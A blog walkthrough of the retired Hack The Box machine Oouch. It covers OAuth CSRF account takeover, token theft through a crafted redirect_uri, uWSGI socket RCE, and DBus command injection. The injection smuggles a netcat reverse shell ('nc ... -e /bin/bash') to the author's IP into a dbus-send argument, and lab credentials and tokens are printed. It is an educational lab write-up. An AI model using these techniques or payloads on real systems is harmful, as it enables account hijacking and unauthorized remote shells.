---
layout: post
title: "Oouch: Hack The Box Walkthrough"
date: 2020-08-02 12:44:58 +0000
last_modified_at: 2020-08-02 12:44:58 +0000
category: Walkthrough
tags: ["Hack The Box", Oouch, retired, Linux, Hard]
comments: true
image:
  feature: oouch-htb-walkthrough.png
---

This post documents the complete walkthrough of Oouch, a retired vulnerable [VM][1] created by [qtc][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Oouch is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.177 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-03 03:47:10 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.177
Discovered open port 21/tcp on 10.10.10.177
Discovered open port 8000/tcp on 10.10.10.177
Discovered open port 5000/tcp on 10.10.10.177
```

Interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,22,5000,8000 -A --reason 10.10.10.177 -oN nmap.txt
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.125
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    syn-ack ttl 62 nginx 1.14.2
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp    syn-ack ttl 62
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest:
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions:
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
```

Since anonymous FTP is allowed, let's go with that first.

{% include image.html image_alt="d5f06bc7.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/d5f06bc7.png" %}

There's a file `project.txt` in the FTP server.

<div class="filename"><span>project.txt</span></div>

```
Flask -> Consumer
Django -> Authorization Server
```

Next up, this is what the `http` service at `5000/tcp` looks like.

{% include image.html image_alt="ec3e611f.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/ec3e611f.png" %}

Well, we can register a new account and explore the site in greater details.

{% include image.html image_alt="6d402e49.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/6d402e49.png" %}

After logging in, this is what I see.

{% include image.html image_alt="200f4b30.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/200f4b30.png" %}

### Fuzzing for Endpoints

Assuming the `http` service is the consumer service based on Flask, let's fuzz for endpoints with `wfuzz`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://10.10.10.177:5000/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.177:5000/FUZZ
Total requests: 4652

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000427:   302        3 L      24 W     247 Ch      "about"
000001194:   302        3 L      24 W     251 Ch      "contact"
000001486:   302        3 L      24 W     255 Ch      "documents"
000002044:   302        3 L      24 W     245 Ch      "home"
000002468:   200        54 L     110 W    1828 Ch     "login"
000002482:   302        3 L      24 W     219 Ch      "logout"
000002822:   302        3 L      24 W     247 Ch      "oauth"
000003251:   302        3 L      24 W     251 Ch      "profile"
000003421:   200        63 L     124 W    2109 Ch     "register"

Total time: 133.2425
Processed Requests: 4652
Filtered Requests: 4643
Requests/sec.: 34.91376
```

The endpoint `/oauth` is certainly eye-catching.

{% include image.html image_alt="f108d5db.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/f108d5db.png" %}

My assumption is right! I'd better put `consumer.oouch.htb` in `/etc/hosts`. If `5000/tcp` corresponds to the consumer service, then `8000/tcp` must corresponds to the authorization service. No harm putting `authorization.oouch.htb` in `/etc/hosts` as well.

After clicking the link I was redirected to another login page at `authorization.oouch.htb/login`.

{% include image.html image_alt="b2a99b59.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/b2a99b59.png" %}

### Fuzzing for Endpoints Redux

Let's do another round of fuzzing for `authorization.oouch.htb`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://authorization.oouch.htb:8000/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://authorization.oouch.htb:8000/FUZZ
Total requests: 4652

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000002044:   301        0 L      0 W      0 Ch        "home"
000002468:   301        0 L      0 W      0 Ch        "login"
000003742:   301        0 L      0 W      0 Ch        "signup"

Total time: 192.7753
Processed Requests: 4652
Filtered Requests: 4649
Requests/sec.: 24.13172
```

This is supposed to be the landing page of `authorization.oouch.htb`.

{% include image.html image_alt="2f7d560a.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/2f7d560a.png" %}

At this point, I'm pretty certain I'm looking at OAuth 2.0. Long story short, explaining how OAuth 2.0 works is beyond the scope of this write-up. Suffice to say, this must be about CSRF (cross-site request forgery) to take over a system administrator account in order to read `/documents`.

{% include image.html image_alt="b161782a.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/b161782a.png" %}

### OAuth CSRF Prevention

The reason why this [attack](https://www.shellvoide.com/hacks/cross-site-request-forgery-attack-on-oauth2-protocol/) works it because the client (`consumer.oouch.htb:5000`) doesn't validate the `state` parameter to ascertain the legitimacy of the request. Here's a demonstration of the `state` parameter in action.

_Clicking on a login request_

**Request**

```
GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read&state=random HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: csrftoken=sZA5gocAvWSkxWjaMoq8p2ZtqVRI4YDJ9i24fbAsXR8W7bxvvCvGlKZWKlmJW3mu; sessionid=r9fz50v1dmyq8huq2scpb8frvnitvib8
Upgrade-Insecure-Requests: 1
```

You can see the `state` parameter at the end of the URL.

**Response**

{% include image.html image_alt="5505fb51.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/5505fb51.png" %}

The `state` parameter is embedded as a hidden input parameter in the authorization page seen above.

**Request**

```
POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read&state=random HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 270
DNT: 1
Connection: close
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read&state=random
Cookie: csrftoken=sZA5gocAvWSkxWjaMoq8p2ZtqVRI4YDJ9i24fbAsXR8W7bxvvCvGlKZWKlmJW3mu; sessionid=r9fz50v1dmyq8huq2scpb8frvnitvib8
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=CQX9Kkgjdb9o4n8kjcxj9RIZszZYvQIx8BtGpAHNIZWrmFn6YkILyu0Uu4Uo1mHp&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Flogin%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=random&response_type=code&allow=Authorize
```

Reading scope is requested as seen above.

**Response**

```
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://consumer.oouch.htb:5000/oauth/login/token?code=zgn3WRt0SQOeGXQiuW96goe0NSkhfu&state=random
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization, Cookie
```

The response is a redirection to the `redirect_uri` parameter as stipulated in the authorization code flow. You can see the authorization code in the `code` parameter as well as the `state` parameter. The authorization server is supposed to return the `state` parameter as-is to the client. The client will then validate the `state` parameter contains a random, non-guessable value to prevent CSRF attack.

### OAuth CSRF Attack

Now that we know the client (`consumer.oouch.htb:5000`) doesn't use the `state` parameter, it's susceptible to OAuth CSRF attack. But, in order to launch the attack, we need to ensure that CSRF exists.

Check out the `/contact` page in the client.


{% include image.html image_alt="34d89d0d.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/34d89d0d.png" %}

We can send message to the system administrator, yo! Here, I'm sending a simple link to my assigned HTB IP address.

{% include image.html image_alt="d7cc12f0.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/d7cc12f0.png" %}

On my machine I have a Apache web server running.

{% include image.html image_alt="5ce4599c.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/5ce4599c.png" %}

CSRF verified! Now it's time to launch the attack.

1. Set up a dummy account in `consumer.oouch.htb:5000/register` with your browser

2. Set up a Oouch account in `authorization.oouth.htb:8000/signup` with your browser

3. Set up Burp to intercept requests.

4. Enter `consumer.oouch.htb:5000/oauth/connect` in the address bar to connect my Oouch account to the system administrator's account in `consumer.oouch.htb:5000`


{% include image.html image_alt="2862f8d1.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/2862f8d1.png" %}

Click on the **Authorize** button.


5. Forward the POST request and intercept the next GET request.


```
GET /oauth/login/token?code=yF6QqlBzYbnAhJK9dxJre2Csb43YuZ HTTP/1.1
Host: consumer.oouch.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read
DNT: 1
Connection: close
Cookie: session=.eJwlT0FuAyEM_AriHFWAMdh5Re5VFBkwyarbpFo2pyh_L1V9sUczGs-87KWvMm467PHzZc0-l_3WMeSq9mBPq8pQsz6uZrmb_WGk1kma_bYM8zM1H_b8Ph-myabjZo_79tSJlmaPlhJT5tBb65JhjhfmTBlTIg8YQQWjNpi38zEAxEIC2aOnLLnXgMFRQQLXg6vMGhVJtHYl1zwUiA2wcMOYqvPFqbByS3V-iTlHmfHr2Pplf3zpfebJucXqtGAnl6B4IS2ViTHkVIrDxK36Vv5qP4du_yWCff8Cv25U0A.XmwzJw.B2-sicm9PxVGSJC9Ae-lwIEjU60
Upgrade-Insecure-Requests: 1
```

That's the authorization code. Drop the request and copy the link `http://consumer.oouch.htb:5000/oauth/connect/token?code=yF6QqlBzYbnAhJK9dxJre2Csb43YuZ`. Send the link to the system administrator at the Contact page.


6. A minute later, our Oouch account is connected and we should be able to log in to the system administrator's account by going to `consumer.oouch.htb:5000/oauth/login`.


{% include image.html image_alt="16029744.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/16029744.png" %}

More importantly, the `/documents` page.

{% include image.html image_alt="a10a49bf.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/a10a49bf.png" %}

### More endpoints to discover

What's the deal about registering applications? If you recall that the Authorization server is based on Django, then the endpoints are configured in [`urls.py`](https://github.com/jazzband/django-oauth-toolkit/blob/master/oauth2_provider/urls.py). There's really no need to fuzz for them.

{% include image.html image_alt="f4921859.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/f4921859.png" %}

### Registering my application with the Authorization Server

Long story short, there are two different endpoints with different set of credentials: `/oauth/applications` and `/oauth/applications/register` at the Authorization Server.

_`/oauth/applications`_

{% include image.html image_alt="d00d3b09.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/d00d3b09.png" %}

_`/oauth/applications/register`_

{% include image.html image_alt="0eb2985c.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/0eb2985c.png" %}

The credential (`develop:supermegasecureklarabubu123!`) applies to `/oauth/applications/register`.

{% include image.html image_alt="ad181af4.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/ad181af4.png" %}

Let's go ahead and register an application with the **Implicit** grant type and my IP address as the `redirect_uri`.

{% include image.html image_alt="46213f18.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/46213f18.png" %}

### Taking over `qtc`'s Oouch account

Take note of the `clientid`. We are going to use this `clientid` to hijack's `qtc`'s `sessionid` cookie and access token to takeover his Oouch account. This is the URL that we will build to trick `qtc` into giving us his account.

```
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=oycaEDes5eBFZaTGc8G2vasCr45J6MOW7pDM4ZlI&response_type=token&redirect_uri=http://10.10.14.130&scope=read&allow=Authorize
```

Note the `clientid`, `response_type`. Paste the URL into the Contact page. I should also mention that I've set up a `tcpdump` to capture the cookie information.

{% include image.html image_alt="8b02adbe.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/8b02adbe.png" %}

Replace your `sessionid` cookie value with the one highlighted above and you should have access to `qtc`'s Oouch account.

{% include image.html image_alt="a6e78a54.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/a6e78a54.png" %}

Time to steal the access token next! Open a new tab in the browser and enter the above URL into the address bar.

**Request**

```
GET /oauth/authorize/?client_id=oycaEDes5eBFZaTGc8G2vasCr45J6MOW7pDM4ZlI&response_type=token&redirect_uri=http://10.10.14.130&scope=read&allow=Authorize HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: sessionid=vyv0d5q3nt1ms5kva9efw8rg45s1pgj4; csrftoken=brcfXgZYLuuDc6tMiiIOB0QMUmyNFr1eBTSgnHfrEB9OHUq6J5gMUrw3etPaSy5f
Upgrade-Insecure-Requests: 1
```

**Response**

```
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://10.10.14.130#access_token=SUUxgGxSpEVsbiIgtYDDsR5Fd5C7BD&expires_in=600&token_type=Bearer&scope=read&state=
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization, Cookie
```

Bam. We got the access token `SUUxgGxSpEVsbiIgtYDDsR5Fd5C7BD`.

## Low-Privilege Shell

With the access token, we can execute the API `/api/get_user` like so.

{% include image.html image_alt="a33bcba3.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/a33bcba3.png" %}

Here's the response.

{% include image.html image_alt="d407a929.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/d407a929.png" %}

Hmm. Where's the SSH key? Let's try `/api/get_ssh`.

{% include image.html image_alt="d78416db.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/d78416db.png" %}

Awesome. With `qtc`'s SSH private key, we can now login to `qtc`'s SSH account.

{% include image.html image_alt="d2c7a36e.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/d2c7a36e.png" %}

And the file `user.txt` is at `qtc`'s home directory.

{% include image.html image_alt="cdf2c6e0.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/cdf2c6e0.png" %}

## Privilege Escalation

During enumeration of `qtc`'s account, I noticed a note in `qtc`'s home directory.

<div class="filename"><span>.note.txt</span></div>

```
Implementing an IPS using DBus and iptables == Genius?
```

This led me to search for DBus system configurations in `/etc/dbus-1/system.d`. And what have we here?

{% include image.html image_alt="806df338.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/806df338.png" %}

<div class="filename"><span>htb.oouch.Block.conf</span></div>

```
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>

</busconfig>
```

The policy is simple enough. Only `www-data` can send and receive messages to/from the system bus.

### SSH private key to `consumer.oouch.htb:5000`

Another observation was that the private key `id_rsa` in `/home/qtc/.ssh` was different from the one I used to login to `qtc`'s account.

{% include image.html image_alt="76fd85ef.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/76fd85ef.png" %}

{% include image.html image_alt="1fbee0ed.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/1fbee0ed.png" %}

That can only mean one thing: this is the private key to one of the docker containers.

{% include image.html image_alt="211a528b.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/211a528b.png" %}

If I had to guess, I would say that `consumer.oouch.htb:5000` is probably the one.

{% include image.html image_alt="b3228473.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/b3228473.png" %}

Awesome.

### DBus Interface

Judging from the note, the DBus interface `htb.oouch.Block` must be the one implementing the IPS through `iptables`. See what happens when my IP address is banned for one minute.

{% include image.html image_alt="f836ea2b.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/61bc393f.png" %}

If we can control what's sent to the DBus interface, we may have a command injection vulnerability! This is the actual code in `consumer.oouch.htb:5000/contact`.

<div class="filename"><span>routes.py</span></div>

```python
# First apply our primitive xss filter
if primitive_xss.search(form.textfield.data):
    bus = dbus.SystemBus()
    block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
    block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

    client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
    response = block_iface.Block(client_ip)
    bus.close()
    return render_template('hacker.html', title='Hacker')
```

### On becoming `www-data`

During enumeration of `qtc`'s account in `consumer.oouch.htb:5000`, I noticed that `/tmp/uwsgi.socket` is world-writable.

{% include image.html image_alt="d7409cda.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/d7409cda.png" %}

Another configuration file that says the same thing is at `/code/uwsgi.ini`.

<div class="filename"><span>uwsgi.ini</span></div>

```
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

Essentially this is the role that uWSGI plays in the grand scheme of things. The web server (nginx in our case) writes something to the socket and uwsgi reads it to execute some python code.

```
the web client <-> the web server <-> the socket <-> uwsgi <-> Django
```

There's an uWSGI RCE [exploit](https://github.com/wofeiwo/webcgi-exploits) that will allow us to get a shell as `www-data`. Perfect.

Prior to running the exploit, I had transferred a copy of `/bin/nc.traditional` from Kali Linux over the machine and the docker container. Time to run the exploit!

{% include image.html image_alt="27d653b4.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/27d653b4.png" %}

On my `nc` listener, a reverse shell appears...

{% include image.html image_alt="da02b6ce.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/da02b6ce.png" %}

Sweet. We can now send a DBus message to the `htb.oouch.Block` interface with `dbus-send`.

```
www-data@aeb4525789d8:/code$ dbus-send --system --dest=htb.oouch.Block --type=method_call --print-reply /htb/oouch/Block htb.oouch.Block.Block 'string:10.10.16.123'
method return time=1584202280.049540 sender=:1.3 -> destination=:1.557 serial=10 reply_serial=2
   string "Carried out :D"
```

{% include image.html image_alt="8b11f686.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/8b11f686.png" %}

It works! I sense the end is near...

```
www-data@aeb4525789d8:/code$ dbus-send --system --dest=htb.oouch.Block --type=method_call /htb/oouch/Block htb.oouch.Block.Block 'string:10.10.16.123; $(/tmp/nc 10.10.16.125 4321 -e /bin/bash)'
```

{% include image.html image_alt="a05c1669.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/a05c1669.png" %}

Getting `root.txt` with a root shell is trivial.

{% include image.html image_alt="4c48d0b2.png" image_src="/b30e57f3-aed7-4093-a21e-73b4bf7d9d0c/4c48d0b2.png" %}

:dancer:

## Afterthought

The verification of CSRF took me a long time because my latency to the Free EU and US servers was too high (it was more than 200ms). It was only when I accessed the Free AU server the CSRF worked when my latency is reduced to less than 100ms. The moment my latency to the server crosses the 100ms mark, the CSRF will fail.


[1]: https://www.hackthebox.eu/home/machines/profile/231
[2]: https://www.hackthebox.eu/home/users/profile/103578
[3]: https://www.hackthebox.eu/
